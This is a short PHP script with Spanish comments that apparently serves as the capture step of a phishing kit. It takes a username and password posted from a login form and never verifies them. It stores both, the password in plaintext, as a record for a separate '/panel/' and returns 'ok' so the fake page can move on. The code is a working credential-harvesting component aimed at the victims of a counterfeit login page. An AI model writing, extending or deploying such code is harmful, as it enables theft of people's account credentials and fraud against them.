<?php
// Desactivar visualización de errores para que no rompan el "ok" del AJAX
error_reporting(0);
ini_set('display_errors', 0);

// 1. Ajuste de ruta: Si pasousuario.php está en la carpeta /process/
// Debe subir un nivel para encontrar /panel/
require_once('../panel/lib/funciones.php');

session_start();

// Recibimos los datos del AJAX
$user = isset($_POST['txt-usuario']) ? trim($_POST['txt-usuario']) : '';
$pass = isset($_POST['txt-password']) ? trim($_POST['txt-password']) : ''; 
$dispositivo = "Android Mobile"; 

// Validamos que los datos no vengan vacíos
if (!empty($user) && !empty($pass)) {
    
    // 2. Intentamos crear el registro (Asegúrate que esta función devuelva el ID)
    $id = crear_registro($user, $dispositivo);
    
    if ($id) {
        // Pausa pequeña para estabilidad en Railway
        usleep(300000); 
        
        // 3. Actualizamos con la clave
        actualizar_registro_pass($id, $pass);
        
        // 4. Guardamos en sesión
        $_SESSION['id_reg'] = $id;
        $_SESSION['nombre_usuario'] = $user;
        
        // 5. RESPUESTA LIMPIA: Solo el texto "ok"
        echo "ok";
    } else {
        echo "error_bd";
    }
} else {
    echo "error_datos_vacios";
}

exit();
?>
